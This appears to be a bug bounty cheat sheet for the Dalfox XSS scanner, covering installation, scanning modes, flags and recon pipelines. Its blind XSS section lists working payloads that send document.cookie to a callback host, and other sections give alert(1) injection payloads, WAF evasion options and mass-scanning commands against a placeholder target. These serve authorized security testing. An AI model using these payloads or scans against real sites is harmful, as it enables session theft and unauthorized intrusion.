# 🦊 Dalfox - XSS Scanning Framework

```
  ██████╗  █████╗ ██╗     ███████╗ ██████╗ ██╗  ██╗
  ██╔══██╗██╔══██╗██║     ██╔════╝██╔═══██╗╚██╗██╔╝
  ██║  ██║███████║██║     █████╗  ██║   ██║ ╚███╔╝ 
  ██║  ██║██╔══██║██║     ██╔══╝  ██║   ██║ ██╔██╗ 
  ██████╔╝██║  ██║███████╗██║     ╚██████╔╝██╔╝ ██╗
  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝
         Powerful XSS Scanner & Analysis Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/Dalfox-XSS_Scanner-blue?style=for-the-badge" alt="Dalfox">
  <img src="https://img.shields.io/badge/Reflected_XSS-green?style=for-the-badge" alt="Reflected">
  <img src="https://img.shields.io/badge/Bug_Bounty-red?style=for-the-badge" alt="Bug Bounty">
</p>

---

## 📋 Table of Contents

- [What is Dalfox](#-what-is-dalfox)
- [Installation](#-installation)
- [Basic Usage](#-basic-usage)
- [Scanning Modes](#-scanning-modes)
- [Advanced Options](#-advanced-options)
- [Blind XSS](#-blind-xss)
- [Quick Reference](#-quick-reference)

---

## 🎯 What is Dalfox

**Dalfox** is a powerful XSS vulnerability scanner and analysis tool:

- 🔍 **Parameter Analysis** - Find reflection points
- 🎯 **XSS Detection** - Reflected & DOM-based
- 💉 **Blind XSS** - Out-of-band testing
- ⚡ **Fast** - Go-based, highly concurrent

### Why Dalfox?

| Feature | Benefit |
|---------|---------|
| Smart Analysis | Context-aware payloads |
| WAF Detection | Bypass common WAFs |
| Blind XSS | OOB interaction support |
| Mining Mode | Find params from JS |

---

## 🚀 Installation

```bash
# Go install (recommended)
go install github.com/hahwul/dalfox/v2@latest

# Homebrew (macOS)
brew install dalfox

# Snap (Linux)
sudo snap install dalfox

# Verify
dalfox version
```

---

## 📖 Basic Usage

### Single URL

```bash
# Basic scan
dalfox url https://example.com/search?q=test

# Save output
dalfox url https://example.com/search?q=test -o results.txt
```

### Multiple URLs

```bash
# From stdin
cat urls.txt | dalfox pipe

# From file
dalfox file urls.txt

# With parallelism
cat urls.txt | dalfox pipe -w 50
```

### Silent Mode

```bash
# Only show vulnerabilities
dalfox url https://example.com/search?q=test --silence

# No color
dalfox url https://example.com/search?q=test --no-color
```

---

## 🔎 Scanning Modes

### URL Mode

```bash
# Scan single URL
dalfox url https://example.com/page?param=value

# Scan with data
dalfox url https://example.com/page?param=value -d "post_param=value"
```

### Pipe Mode

```bash
# From stdin
echo "https://example.com/search?q=test" | dalfox pipe

# Multiple URLs
cat urls_with_params.txt | dalfox pipe
```

### File Mode

```bash
# From file
dalfox file urls.txt

# With output
dalfox file urls.txt -o results.txt
```

### Server Mode

```bash
# Start API server
dalfox server

# Custom port
dalfox server -p 8080

# Then send requests:
# POST http://localhost:8090/scan
# {"url": "https://example.com/search?q=test"}
```

---

## ⚙️ Advanced Options

### Custom Headers

```bash
# Add header
dalfox url https://example.com/search?q=test -H "Authorization: Bearer token"

# Multiple headers
dalfox url https://example.com/search?q=test \
  -H "Cookie: session=abc" \
  -H "X-Forwarded-For: 127.0.0.1"
```

### Cookie & Authentication

```bash
# With cookie
dalfox url https://example.com/search?q=test -C "session=abc123"

# Basic auth
dalfox url https://example.com/search?q=test --basic-auth "user:pass"
```

### Custom Payloads

```bash
# Use custom payload file
dalfox url https://example.com/search?q=test --custom-payload payloads.txt

# Single custom payload
dalfox url https://example.com/search?q=test -p '<script>alert(1)</script>'

# Payload format in file:
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# <svg onload=alert(1)>
```

### Output Formats

```bash
# JSON output
dalfox url https://example.com/search?q=test --format json -o result.json

# Only vulnerabilities
dalfox url https://example.com/search?q=test --only-poc
```

### Performance

```bash
# Set workers (parallelism)
dalfox url https://example.com/search?q=test -w 100

# Timeout (seconds)
dalfox url https://example.com/search?q=test --timeout 10

# Delay between requests (ms)
dalfox url https://example.com/search?q=test --delay 100
```

### WAF Evasion

```bash
# Use WAF bypass
dalfox url https://example.com/search?q=test --waf-evasion

# Ignore fingerprint
dalfox url https://example.com/search?q=test --skip-mining
```

### Proxy

```bash
# HTTP proxy
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080

# For Burp Suite
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080
```

---

## 💉 Blind XSS

### Using Blind XSS Payload

```bash
# With XSS Hunter / Burp Collaborator
dalfox url https://example.com/form?input=test -b "https://your.xss.ht"

# The -b flag adds blind XSS callbacks
```

### Blind XSS with Custom Payload

```bash
# Custom blind payload
dalfox url https://example.com/form?name=test \
  --blind "https://your.xss.ht" \
  --custom-payload blind_payloads.txt
```

### Example Blind Payloads

```html
"><img src=x onerror="fetch('https://your.xss.ht/'+document.cookie)">
"><script src="https://your.xss.ht"></script>
'"><script>new Image().src="https://your.xss.ht/?c="+document.cookie</script>
```

---

## 📊 Quick Reference

### Basic Commands

| Command | Description |
|---------|-------------|
| `dalfox url URL` | Scan single URL |
| `dalfox file file.txt` | Scan from file |
| `cat urls \| dalfox pipe` | Scan from stdin |
| `dalfox server` | Start API server |

### Essential Flags

| Flag | Description |
|------|-------------|
| `-o file.txt` | Output file |
| `-w 50` | Workers (parallelism) |
| `-H "Header: value"` | Custom header |
| `-C "cookie=value"` | Cookie |
| `-b "url"` | Blind XSS callback |
| `--proxy URL` | HTTP proxy |
| `--timeout 10` | Request timeout |

### Output Options

| Flag | Description |
|------|-------------|
| `--format json` | JSON output |
| `--only-poc` | Only show PoC |
| `--silence` | Silent mode |
| `--no-color` | No colored output |

### Payload Options

| Flag | Description |
|------|-------------|
| `-p "payload"` | Custom payload |
| `--custom-payload file` | Payload file |
| `--waf-evasion` | WAF bypass mode |

---

## 🎯 Bug Bounty Workflows

### Basic XSS Scan

```bash
# Quick scan
dalfox url "https://target.com/search?q=test" --silence
```

### From URL Collection

```bash
# GAU + Dalfox
gau target.com | grep "=" | dalfox pipe -o xss_results.txt

# Wayback + Dalfox
echo target.com | waybackurls | grep "=" | dalfox pipe --silence
```

### Mass Scanning

```bash
# Scan all params from URLs
cat all_urls.txt | grep "?" | dalfox pipe -w 100 -o found_xss.txt
```

### With GF Patterns

```bash
# Using GF + Dalfox
gau target.com | gf xss | dalfox pipe --silence

# With httpx filter
gau target.com | gf xss | httpx -silent | dalfox pipe
```

### Authenticated Scanning

```bash
# With session
dalfox url "https://target.com/dashboard?search=test" \
  -C "session=abc123" \
  -H "Authorization: Bearer token" \
  -o auth_xss.txt
```

### Comprehensive Pipeline

```bash
# Full XSS hunting pipeline
subfinder -d target.com -silent | \
  httpx -silent | \
  gau | \
  gf xss | \
  uro | \
  dalfox pipe -w 50 --silence -o xss_vulnerabilities.txt
```

### Blind XSS Campaign

```bash
# Mass blind XSS
cat contact_forms.txt | dalfox pipe -b "https://your.xss.ht" --silence

# Specifically for input forms
cat form_urls.txt | dalfox pipe \
  -b "https://your.xss.ht" \
  --custom-payload blind_xss.txt \
  -w 10
```

---

## 💡 XSS Hunting Tips

1. **Check all parameters** - Not just obvious ones
2. **Test different contexts** - HTML, JS, attributes
3. **Use Blind XSS** - For admin panels, logs
4. **Chain with open redirect** - For higher impact
5. **Check response headers** - CSP, X-XSS-Protection
6. **Test POST params** - Often overlooked

### Common XSS Injection Points

```
- Search boxes
- User profile fields
- Comments/feedback
- URL parameters
- HTTP headers (Referer, User-Agent)
- File names in uploads
- Error messages
```

### Context-Specific Payloads

| Context | Payload |
|---------|---------|
| HTML | `<script>alert(1)</script>` |
| Attribute | `" onmouseover="alert(1)"` |
| JavaScript | `';alert(1)//` |
| URL | `javascript:alert(1)` |

---

## 📚 Resources

- [Dalfox GitHub](https://github.com/hahwul/dalfox)
- [XSS Payloads](https://github.com/payloadbox/xss-payload-list)

### Related Cheatsheets
- [Bug Bounty Methodology](../Bug-Bounty-Methodology/README.md)
- [XSS Payloads](../Payloads/XSS.md)
- [Burp Suite](../Burp-Suite/README.md)

---

<p align="center">
  <b>🦊 Find XSS Vulnerabilities!</b><br>
  <i>Dalfox - The XSS Hunter's Friend</i>
</p>
